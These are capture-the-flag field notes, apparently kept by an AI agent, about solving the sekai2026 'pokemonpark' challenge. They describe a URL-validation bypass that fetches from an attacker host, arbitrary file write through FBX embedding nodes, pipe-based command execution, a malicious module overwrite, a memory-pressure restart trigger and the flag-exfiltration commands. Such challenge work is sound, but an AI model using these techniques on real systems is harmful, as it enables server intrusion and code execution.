---
title: "misc_pokemonpark notes"
description: "Primary bug is in /api/model: validation uses decodeURIComponent(path).split(\"file://\").pop() and normalizes only that suffix, but the sink does fetch(path) on the original URL. Validation/fetch mismatch pay…"
published: "2026-06-28"
updated: "2026-06-28"
event: "sekai2026"
category: "Miscellaneous"
kind: "field-note"
status: "solved"
tags: ["Miscellaneous", "sekai2026", "Field notes"]
readingTime: 14
wordCount: 2917
featured: false
sourcePath: "~/ctf/sekai2026/misc_pokemonpark/notes.md"
---

# misc_pokemonpark notes

## Confirmed facts from prior local work

- Primary bug is in `/api/model`: validation uses `decodeURIComponent(path).split("file://").pop()` and normalizes only that suffix, but the sink does `fetch(path)` on the original URL.
- Validation/fetch mismatch payload shape:
  - `http://ATTACKER/payload.fbx#file:///app/models/pm0343_00.fbx`
  - suffix passes `MODELS_DIR`/exists checks while `fetch()` retrieves attacker HTTP content.
- If fetched bytes start with `Kaydara FBX Binary`, server writes them to `/tmp/<uuid>.fbx` and invokes bundled `FBX2glTF`.
- Autodesk FBX SDK import has arbitrary file write through top-level `Embedding` node:
  - `Embedding -> File -> Filename: "/tmp/pwned" -> Content -> BinaryData`
  - Verified writes include `/tmp/epwnabs.txt`, `/tmp/edir/epwn.txt`; traversal also works.
- Local command execution observed via FBX cache filename beginning with `|`, causing SDK to open a shell/pipe command.
  - Working local trigger required converter CWD to contain the Maya cache XML sidecar.
  - Example trace:
    - `[fopen64] |touch /tmp/FIXPWN2.mc mode=rb`
    - `[execvp] file=touch argv[0]=touch argv[1]=/tmp/FIXPWN2.mc`
  - Created `/tmp/FIXPWN2.mc`.
- Intended exfil after RCE:
  - write glTF-like output to `/tmp/out`: `printf glTF >/tmp/out; /readflag >>/tmp/out`
  - retrieve with `/api/model?filename=file:///tmp/out#file:///app/models/pm0343_00.fbx`
  - server returns base64 directly when file begins with `glTF`.

## Current blocker

- In the real Docker app `WORKDIR /app` and `CMD ["bun", "src/index.ts"]` strongly suggest converter CWD is `/app`.
- The embedding primitive can write to `/tmp`, but the current cache-RCE path resolves the XML sidecar relative to converter CWD, so the next tests need to make the XML visible from `/app`, use an absolute cache descriptor path, or pivot via arbitrary write.

## Next tests

- Extract challenge archive and inspect app/converter invocation.
- Reproduce local Docker behavior with converter CWD `/app`.
- Test cache XML lookup variants:
  - embedding to `/app/<name>.xml` if permissions allow
  - absolute cache path syntax
  - traversal/relative path from `/app` to `/tmp`
  - multi-embedding chain to place sidecar and payload under a resolvable path
- If cache route cannot be made remote-reliable, test arbitrary write pivots into source overwrite/restart or writable loader/config paths.

## New observations

- Extracted archive to `artifacts/misc_pokemon-park`; source confirms:
  - `WORKDIR /app`, `USER bun`.
  - `/app` is root-owned `0755`; user `bun` cannot write `/app`, but can write `/tmp`.
  - `fbx2gltf` wrapper spawns bundled `bin/Linux/FBX2glTF` without `cwd`, so converter inherits `/app`.
- Built local Docker image `sekai-pokemonpark:test`; verified `/tmp` writable and `/app` not writable by `bun`.
- Installed scratch copy at `scratch/app`; converter version is `FBX2glTF 0.9.7`.
- Wrote `scratch/fbx_tools.py`, a binary FBX parser/mutator. It can parse `pm0343_00.fbx`, append embeddings, and round-trip to a converter-accepted FBX.
- Tested a possible CWD bypass for cache-RCE:
  - cache filename `|sh /tmp/codexcache.xml`
  - `/tmp/codexcache.xml` is a shell script that prints valid cache XML
  - follow-up `.mc` path should become `|sh /tmp/codexcache.mc`
  - Result: our hand-written cache object did not trigger cache opens.
- Pulled `lerignoux/python-fbx` and used the Autodesk Python SDK to generate a valid `FbxCache` + `FbxVertexCacheDeformer` attached to a mesh:
  - outputs: `scratch/sdk/sdk_cache_ascii.fbx`, `scratch/sdk/sdk_cache_bin.fbx`
  - SDK-emitted connection is `C: "OO", cache_id, deformer_id`; object names are `codex_cache\x00\x01Cache` and `codex_deformer\x00\x01Deformer`.
  - FBX2glTF converts the SDK-generated cache FBX but still does not open the cache filename under default options or tested converter flags (`--verbose`, `--anim-framerate`, `--user-properties`).

## Current hypothesis

- The user's prior cache-RCE trigger is real in Autodesk cache parsing, but FBX2glTF's normal conversion path may not request external geometry cache data unless a specific scene/evaluator state causes it.
- Need either:
  - identify the missing scene/animation/evaluation condition that makes FBX2glTF open `FbxCache`, or
  - pivot from arbitrary write to a file that affects app behavior without restart, or causes a reliable restart/load path.

## 2026-06-28 cache sample progress

- Autodesk `ExportScene03` sample creates a cache object that FBX2glTF does try to open during import.
  - With input `scratch/sdk/sample/ExportScene03_MC.fbx`, strace shows `openat(... ExportScene03_MC_fpc/Triangle.xml, O_RDONLY)`.
  - The sample as shipped created a directory named `Triangle.xml`, so XML parsing failed before any `.mcx` read.
- This differs from earlier custom `FbxCache` attempts. The sample-style cache has:
  - `Deformer.Active = true`
  - `CacheFileName = "ExportScene03_MC_fpc/Triangle.xml"`
  - `CacheAbsoluteFileName` set
  - a real animation stack and written cache stream.
- Mutating only `CacheAbsoluteFileName` to a pipe command did not fire; importer still used the relative `CacheFileName`.
- Mutating relative `CacheFileName` to a pipe string also did not fire in FBX2glTF, likely due path resolution/existence filtering before cache open.
- Added `scratch/gen_export_scene03_fixed.py` to generate a valid sample FBX with a real Maya cache XML descriptor instead of the broken directory path.

## 2026-06-28 overwrite pivot

- Docker image has many world-writable package files. Most important:
  - `/app/node_modules/fbx2gltf/index.js` is world-writable but is loaded/cached at Bun startup, so overwriting it does not affect the running process.
  - `/app/node_modules/fbx2gltf/bin/Linux/FBX2glTF` is world-writable and is spawned fresh on every conversion. Manual overwrite with a shell script works immediately; the next `/api/model` conversion returns `glTF` plus `/readflag` output.
- Manual replacement script shape:
  - parse `--output <path>`
  - write `glTF` then `/readflag` output to `<path>.glb`
  - exit 0
- The old `scratch/fbx_tools.py` full-file dumper degrades `pm0343_00.fbx` into a converter-accepted but mostly empty scene, and extraction no longer happens. Added `scratch/fbx_append_embed.py` to preserve the original FBX bytes and append a top-level `Embedding` node before the final null/footer.
- Append-only embedding confirmed: it writes `/tmp/APPEND_EMB_MARK` while preserving the original scene and texture extraction.
- Embedding to the running Linux `FBX2glTF` executable is blocked in the real Docker image:
  - `open(... FBX2glTF, O_WRONLY|O_CREAT|O_TRUNC) = ETXTBSY`
  - directory is root-owned, so no unlink/replace fallback.
- Next cache hypothesis: user trace used `.mc` and a raw leading `|` filename, while FBX7/sample path here uses `.mcx` and canonicalizes/rejects pipe-shaped cache names. Added writer-format support to `scratch/gen_export_scene03_fixed.py` to test FBX 6.0 cache reader behavior.
- FBX6 writer formats did not help:
  - FBX6 ASCII imports but FBX2glTF does not open the cache sidecar.
  - PC2 (`CacheFileType=1`) pipe filenames return `OpenFileForRead False`; no execution.
  - Direct SDK status for pipe Maya cache shows path resolution like `Cache file not found: /.xml, /work/|touch ...`, confirming it prepends/normalizes before pipe open in this path.
- Restart fallback:
  - `/app/node_modules/fbx2gltf/index.js` is world-writable and can be overwritten by append-only embedding.
  - Existing Bun process caches the old wrapper, so restart is required.
  - Added `scratch/malicious_fbx2gltf_index.js`: exports a convert function that writes `glTF` + `execFileSync("/readflag")` to the requested destination.
- Local API verification:
  - Generated append-only payload writing `/app/node_modules/fbx2gltf/index.js`.
  - Triggered through `/api/model?filename=file:///tmp/payload.fbx%23file:///app/models/pm0343_00.fbx`; response 200 and `index.js` content changed.
  - After `docker restart`, `/api/model?filename=file:///app/models/pm0343_00.fbx` returned base64 for `glTFSEKAI{dummy_flag}`.

## 2026-06-28 solver polish

- `solve.py` originally treated any decoded `glTF...` response as success. That is wrong because a normal GLB model also starts with `glTF`.
- Patched `decode_flag_response()` to require a flag-like marker (`SEKAI{`, `flag{`, `FLAG{`, `CTF{`) inside the decoded GLB before printing success.
- First clean rerun still failed because the standalone solver's recursive FBX node builder passed child tuple fields in the wrong order, corrupting nested end offsets. The generated FBX parsed with `unknown prop type '('`.
- Fixed the recursive FBX encoder to pass absolute child offsets and the child `force_null` flag in the correct position.
- Verified with a clean `pkmn-verify` container:
  - `python solve.py http://127.0.0.1:3012 --serve --serve-port 8014 --public-host 172.17.0.1 --poll-seconds 60`
  - trigger returned HTTP 200 and `/app/node_modules/fbx2gltf/index.js` became the malicious 258-byte wrapper.
  - after `docker restart pkmn-verify`, the solver printed `SEKAI{dummy_flag}`.
- Local constrained-memory restart test:
  - started `pkmn-oom` with `--restart=unless-stopped --memory=128m --memory-swap=128m`.
  - ran `python solve.py http://127.0.0.1:3013 --serve --serve-port 8015 --public-host 172.17.0.1 --oom-mb 512 --oom-timeout 30 --poll-seconds 120`.
  - the large `/oom` fetch caused the container to restart once (`RestartCount=1`); after restart the overwritten wrapper loaded and the solver printed `SEKAI{dummy_flag}`.
  - `OOMKilled=false` and `ExitCode=0` in Docker state, so describe this as a memory-pressure/restart trigger rather than strictly an OOM kill.
- Patched `solve.py` so `--oom-mb` starts the local helper server even when `--payload-url` points to an externally hosted payload; the local helper is still needed for `/oom`.
- Final status: local end-to-end chain is verified. Without `--oom-mb`, it requires a service restart after arbitrary write. With a memory-limited container and restart policy, `--oom-mb` provides a fully remote restart trigger.

## 2026-06-28 remote attempt status

- Recovered a valid SEkai platform auth token locally and used the challenge instancer API. Sensitive token values are stored only under `scratch/` and should not be printed.
- Current instancer endpoint:
  - `GET/PUT/DELETE https://ctf.sekai.team/api/v2/integrations/challs/misc_pokemon%20park/instance`
  - auth header: `Authorization: Bearer <authToken>`
- Current started host is saved in `scratch/current_instance_host.txt`.
- Uploaded the module-overwrite FBX payload to a public URL:
  - `https://o.uguu.se/pZseVGDQ.fbx`
- Remote module-overwrite request returned HTTP 200, but polling normal model never produced a flag.
- Public memory-pressure URLs tested:
  - `https://proof.ovh.net/files/1Gb.dat`
  - `https://proof.ovh.net/files/10Gb.dat`
  - `http://speedtest.tele2.net/10GB.zip`
- A 1 GiB public fetch caused a proxy 502 on the old instance but did not lead to the overwritten wrapper being loaded. Stop/start through the platform assigned a new hostname and appears to recreate the writable layer, so it is not a useful persistence/reload trigger.
- Current conclusion: the wrapper overwrite is correct locally but insufficient remotely unless the same container/process can be restarted without losing its modified filesystem. Need a no-restart execution path or a same-container reload/crash path.

## 2026-06-28 current next tests

- Return to the Autodesk cache path because it can potentially execute during the same FBX import.
- Test whether cache sidecars can be placed under `/tmp` with the embedding primitive and referenced from converter CWD `/app` via paths like `../tmp/Triangle.xml`.
- If `/tmp` sidecars load, try pipe-name variants that keep the raw filename beginning with `|` at the moment the SDK opens the cache stream.

## 2026-06-28 cache/RCE follow-up

- Installed a disposable Python 2.7 env at `scratch/py27` so the bundled Autodesk Python SDK bindings work again.
- Generated a clean binary ExportScene03 cache sample with writer format 0:
  - `scratch/tmp_sidecar_test/pokeabs/pokeabs.fbx`
  - cache properties: `CacheFileName = pokeabs_fpc/Triangle.xml`, `CacheAbsoluteFileName = /tmp/pokeabs_fpc/Triangle.xml`
  - FBX2glTF opens `/tmp/pokeabs_fpc/Triangle.xml` and `/tmp/pokeabs_fpc/Triangle.mcx`.
- Multiple separate top-level `Embedding` nodes only extracted the first cache sidecar before cache load. A single grouped `Embedding` node containing both `File` children extracts both XML and MCX before cache load.
  - Added `scratch/append_embedding_group.py`.
  - Grouped embedding verified: one FBX writes `/tmp/pokeabs_fpc/Triangle.xml` and `.mcx`, then immediately reads both during the same import.
- Raw pipe behavior:
  - SDK-authored `CacheAbsoluteFileName = |sh /tmp/pokeexec` plus a valid literal descriptor file `|sh /tmp/pokeexec.xml` in the process CWD causes the data-file open to execute `sh /tmp/pokeexec.mcx`.
  - Trace showed `execve("/usr/bin/sh", ["sh", "/tmp/pokeexec.mcx"], ...)` and a marker file was created.
  - The descriptor XML itself is opened as a literal file first; only the derived `.mcx` data file takes the pipe path.
- Blocker remains remote CWD `/app`:
  - `/app` and all directories under it are root-owned `0755`; no writable directory exists where a literal `|...xml` descriptor can be created.
  - The only world-writable files are existing package files, not directories or pathnames beginning with `|`.
  - A pipe in a later path component like `/tmp/|sh /tmp/pokeexec.mcx` is opened normally, not as a pipe.
  - Relative embeddings are extracted below `/tmp/<input>.fbm`, not process CWD.
- Negative checks:
  - Texture `FbxFileTexture` pipe paths generated through the SDK did not trigger external file opens in FBX2glTF.
  - Embedding `Filename = |sh /tmp/embcmd` is treated as a normal file under the `.fbm` extraction directory, not a pipe.
  - A relative descriptor file plus absolute pipe cache name does not execute; once XML is loaded from the relative path, the data filename is derived from that same normal path.

## 2026-06-28 native/cache dead ends after follow-up

- Patched `scratch/gen_export_scene03_fixed.py` to support `CACHE_REL`, `CACHE_ABS`, and `CACHE_FORMAT=max|pc2|1` so cache formats could be generated from the Autodesk SDK instead of hand-mutated nodes.
- Added `scratch/gen_cache_only.py` for minimal arbitrary-format `FbxCache` objects and `scratch/gen_external_media.py` for SDK-authored external media reference probes.
- Cache parser disassembly matches the observed blocker:
  - `awCacheFileAccessor::constructDescriptionFileFullPath` builds the descriptor path as `folder + basename + ".xml"`.
  - `constructDataFilePathForOneFile*` derives the data path after the descriptor is accepted.
  - Raw leading `|` reaches the pipe/open gadget only on the derived data-file path, while the descriptor must already exist as a literal path.
- PC2 / Max PointCache and Alembic cache formats do not bypass the descriptor problem:
  - format `1` stats/opens `|... .pc2` as a normal path and does not exec.
  - format `3` stats/opens `|... .abc` as a normal Alembic path and does not exec.
- External media/reference probes were negative under FBX2glTF:
  - `FbxFileTexture`, `FbxVideo`, `FbxAudio`, and `FbxSceneReference` pipe paths did not trigger external opens or execution.
  - `FbxMediaClip.Create` is unavailable/returns `None` in the Python binding used here.
- Dynamic-loader pivot is weak:
  - `FBX2glTF` has no RPATH/RUNPATH and links only ordinary system libraries.
  - Normal converter strace did not show writable plugin/config files being loaded.
- Node/Bun lazy-load pivot is weak:
  - Patched 1,529 world-writable `.js` files in a running container and exercised normal routes, invalid/valid `/api/model`, FBX conversion, static vendor file, and 404s.
  - No marker executed, so post-startup CommonJS lazy loading does not appear reachable.
  - Elysia query parsing returns `Object.create(null)` and `mergeDeep` skips `__proto__`, `constructor`, and `prototype`, so prototype-pollution into runtime config is unlikely.

## 2026-06-28 next hypotheses

- Find another Autodesk/FBX file-open path that passes a raw leading `|` directly to the pipe open without the cache descriptor precondition.
- Continue symbol/callgraph search around `awCacheFileIffIO::open`, `execvp`, and classes that load external resources during import.
- If no no-restart native path exists, revisit same-container reload/crash only with evidence that the writable layer survives; prior remote platform stop/start starts a fresh instance and loses the overwrite.

## 2026-06-28 state snapshot and action plan

### Working exploit pieces

- The web bug is solid: `/api/model` validates the normalized suffix after the last `file://`, but `fetch()` consumes the original attacker-controlled URL.
  - Remote fetch payload shape: `https://ATTACKER/payload.fbx#file:///app/models/pm0343_00.fbx`
  - The suffix satisfies `/app/models/...` validation, while the server fetches attacker content.
- The converter path is reachable remotely:
  - if fetched content begins with `Kaydara FBX Binary`, the app writes it to `/tmp/<uuid>.fbx` and runs bundled `FBX2glTF`.
  - if fetched content begins with `glTF`, `toGlb()` returns it directly as base64.
- Autodesk FBX import gives arbitrary file write through a top-level grouped `Embedding` node.
  - Absolute writes work under writable parents such as `/tmp`.
  - Relative embedding filenames extract under `/tmp/<input>.fbm/`, not process CWD.
  - Grouping multiple `File` children in one `Embedding` is important; separate embeddings can be too late for cache sidecar extraction.
- Local restart chain is verified:
  - overwrite `/app/node_modules/fbx2gltf/index.js` with a malicious wrapper.
  - after same-container Bun restart, the next model conversion writes `glTF` plus `/readflag` output.
  - local memory-pressure restart works in a constrained container with restart policy and preserves the writable layer.
- Flag exfil route after command execution:
  - create `/tmp/out` starting with `glTF`, then append `/readflag`.
  - fetch `/api/model?filename=file:///tmp/out#file:///app/models/pm0343_00.fbx`.

### Main blocker

- Remote no-restart RCE is not done.
- Overwriting `/app/node_modules/fbx2gltf/index.js` does not affect the already-running Bun process.
- Overwriting `/app/node_modules/fbx2gltf/bin/Linux/FBX2glTF` during conversion fails with `ETXTBSY`.
- Platform stop/start appears to create a fresh instance and loses the modified writable layer.
- Public large-file memory-pressure fetches caused errors/502s but did not reload the overwritten wrapper on remote.

### Cache pipe primitive status

- Autodesk's old FL/IFF file layer supports pipe commands. Binary callsite search confirms `execvp` is inside `fbxsdk::fl_exec`, reached through `FLsopen`/`FLsopen8` and `ff_cnct`/`ff_cnct8`.
- The successful local cache-RCE path is real:
  - `CacheAbsoluteFileName = |sh /tmp/pokeexec`
  - a literal descriptor file named `|sh /tmp/pokeexec.xml` must exist in process CWD.
  - then the derived data-file open executes `sh /tmp/pokeexec.mcx`.
- This does not directly work in Docker app:
  - converter CWD is `/app`.
  - `/app` has no writable directories/entries where a literal `|...xml` descriptor can be created.
  - `/tmp` can hold sidecars, but a pipe character in a later path component is opened normally and does not execute.
- Disassembly supports the structural blocker:
  - descriptor path is constructed before pipe open as `folder + basename + ".xml"`.
  - pipe semantics only apply after a descriptor has been accepted and a data path is opened.

### Ruled-out paths

- Cache format variations:
  - Maya cache needs descriptor first.
  - PC2 / Max PointCache does not exec.
  - Alembic cache does not exec.
  - FBX6 writer variations did not produce a useful bypass.
- External media/reference probes:
  - `FbxFileTexture`, `FbxVideo`, `FbxAudio`, `FbxSceneReference`, and attempted `FbxMediaClip` did not trigger useful pipe opens in FBX2glTF.
- Dynamic loader/plugin pivot:
  - `FBX2glTF` has no RPATH/RUNPATH.
  - normal strace showed no writable plugin/config load path.
- Bun/Node lazy module pivot:
  - patched 1,529 world-writable `.js` files after startup and exercised routes; no marker executed.
  - Elysia query parser and merge helpers look resistant to simple prototype pollution.

### Immediate action plan

1. Continue native callgraph/xref work from the FL pipe layer.
   - Use radare2/objdump xrefs around `FbxCachedFile::Open`, `FbxScopedLoadingFileName`, `FbxScopedLoadingDirectory`, `KTypeReadReferences`, `Fbx6TypeReadReferences`, and FBX readers that resolve external documents.
   - Goal: find any import-time path that passes an attacker-controlled string beginning with `|` to `FLopen`/`FLopen8` without the cache XML descriptor requirement.
2. Generate only targeted SDK-authored FBXs for promising object types.
   - Avoid broad media probes already ruled out.
   - Prioritize `FbxCachedEffect`, `FbxOpticalReference`, reference-document internals, and any reader path shown by xrefs to call `FbxCachedFile::Open` or scoped loading.
3. Recheck same-process arbitrary-write pivots only if native RCE stalls.
   - Look for writable files read on every request/conversion, not startup-only files.
   - Focus on Bun/JS modules imported dynamically or converter inputs/config actually opened after overwrite.
4. Keep `solve.py` aligned with whichever path becomes final.
   - Current solver is valid for local restart chain.
   - Final remote solver should either produce same-import RCE or a proven same-container reload trigger, then perform `/tmp/out` glTF exfil.

## 2026-06-28 resume session

- Resumed from notes after local restart chain was verified but remote no-restart RCE remained blocked.
- No `AGENTS.md` found under the current challenge parent scan.
- Loaded `solve-challenge`, `ctf-misc`, and `ctf-reverse` guidance.
- Current focus: static/dynamic callgraph around the bundled Linux `FBX2glTF` file-open paths, especially raw leading `|` propagation into the Autodesk FL pipe layer without the Maya cache descriptor precondition.

## 2026-06-28 platform API check

- Frontend bundle confirms a generic instancer action route:
  - `POST /api/v2/integrations/challs/:id/instance/actions/:action`
- Queried `/api/v2/challs` with the locally recovered bearer token and filtered for this challenge.
- `misc_pokemon park` metadata has:
  - `instancerLifetime = 1800000`
  - `instancerExtendable = true`
  - `instancerStoppable = true`
  - `instancerActions = []`
- Conclusion: the platform does not advertise a same-instance restart/action for this challenge. Continue native no-restart path.
